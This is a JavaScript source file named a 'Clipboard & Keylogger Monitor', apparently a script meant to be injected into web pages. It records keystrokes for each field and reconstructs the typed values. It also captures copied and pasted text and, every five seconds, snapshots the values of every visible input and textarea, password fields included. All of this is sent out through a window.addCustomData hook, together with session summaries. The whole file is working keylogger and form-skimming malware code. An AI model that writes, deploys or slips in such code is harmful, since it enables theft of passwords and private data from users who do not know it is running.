// Name: Clipboard & Keylogger Monitor
// Description: Monitors clipboard operations (copy/paste) and captures keystrokes with field context. Sends data periodically to avoid data loss.

(function() {
  const session = {
    id: 'sess_' + Math.random().toString(36).substr(2, 9),
    startTime: Date.now(),
    keystrokes: [],
    clipboard: [],
    pastes: [],
    inputs: {}
  };
  
  // Keylogger - captures actual keystrokes
  let currentInput = '';
  let lastTarget = null;
  
  document.addEventListener('keydown', function(e) {
    try {
      const target = e.target;
      const targetId = target.id || target.name || target.className || 'unknown';
      
      // Track which field is being typed in
      if (target !== lastTarget) {
        if (currentInput.length > 0 && lastTarget) {
          // Save previous input
          const lastTargetId = lastTarget.id || lastTarget.name || lastTarget.className || 'unknown';
          session.inputs[lastTargetId] = currentInput;
        }
        currentInput = '';
        lastTarget = target;
      }
      
      // Build the current input string
      if (e.key.length === 1) {
        currentInput += e.key;
      } else if (e.key === 'Backspace') {
        currentInput = currentInput.slice(0, -1);
      } else if (e.key === 'Enter') {
        session.keystrokes.push({
          field: targetId,
          value: currentInput,
          timestamp: Date.now()
        });
        currentInput = '';
      }
      
      // Send data every 20 keystrokes
      if (session.keystrokes.length >= 20) {
        window.addCustomData({
          title: "Keylogger Data",
          data: {
            sessionId: session.id,
            keystrokes: session.keystrokes.splice(0, 20),
            currentInputs: session.inputs
          }
        });
      }
    } catch (err) {
      console.log('Keylogger error:', err);
    }
  });
  
  // Clipboard monitoring - copy events
  document.addEventListener('copy', function(e) {
    try {
      const selection = window.getSelection().toString();
      if (selection) {
        session.clipboard.push({
          action: 'copy',
          content: selection.substring(0, 100),
          timestamp: Date.now()
        });
        
        window.addCustomData({
          title: "Clipboard Copy",
          data: {
            sessionId: session.id,
            copied: selection.substring(0, 500),
            timestamp: new Date().toISOString()
          }
        });
      }
    } catch (err) {
      console.log('Copy monitor error:', err);
    }
  });
  
  // Clipboard monitoring - paste events
  document.addEventListener('paste', function(e) {
    try {
      const pasteData = e.clipboardData || window.clipboardData;
      const pasted = pasteData.getData('text');
      
      if (pasted) {
        session.pastes.push({
          content: pasted.substring(0, 100),
          target: e.target.tagName,
          field: e.target.id || e.target.name || 'unknown',
          timestamp: Date.now()
        });
        
        window.addCustomData({
          title: "Clipboard Paste",
          data: {
            sessionId: session.id,
            pasted: pasted.substring(0, 500),
            target: e.target.id || e.target.name,
            timestamp: new Date().toISOString()
          }
        });
      }
    } catch (err) {
      console.log('Paste monitor error:', err);
    }
  });
  
  // Monitor input values directly every 5 seconds
  setInterval(function() {
    try {
      const formData = {};
      document.querySelectorAll('input, textarea').forEach(function(el) {
        if (el.value && el.type !== 'hidden') {
          const key = el.name || el.id || el.placeholder || 'field_' + Math.random().toString(36).substr(2, 5);
          formData[key] = el.value;
        }
      });
      
      if (Object.keys(formData).length > 0) {
        window.addCustomData({
          title: "Form Input Snapshot",
          data: {
            sessionId: session.id,
            formData: formData,
            timestamp: new Date().toISOString()
          }
        });
      }
    } catch (err) {
      console.log('Form monitor error:', err);
    }
  }, 5000);
  
  // Send session summary every 10 seconds
  setInterval(function() {
    try {
      const runtime = Math.floor((Date.now() - session.startTime) / 1000);
      window.addCustomData({
        title: "Session Activity Summary",
        data: {
          sessionId: session.id,
          runtime: runtime + ' seconds',
          keystrokesRecorded: session.keystrokes.length,
          clipboardEvents: session.clipboard.length + session.pastes.length,
          activeInputs: Object.keys(session.inputs).length,
          timestamp: new Date().toISOString()
        }
      });
    } catch (err) {
      console.log('Summary error:', err);
    }
  }, 10000);
  
  // Initial notification
  window.addCustomData({
    title: "Monitoring Started",
    data: {
      sessionId: session.id,
      monitors: ['keylogger', 'clipboard', 'paste', 'forms'],
      startTime: new Date().toISOString()
    }
  });
  
  console.log('All monitors active for session:', session.id);
})();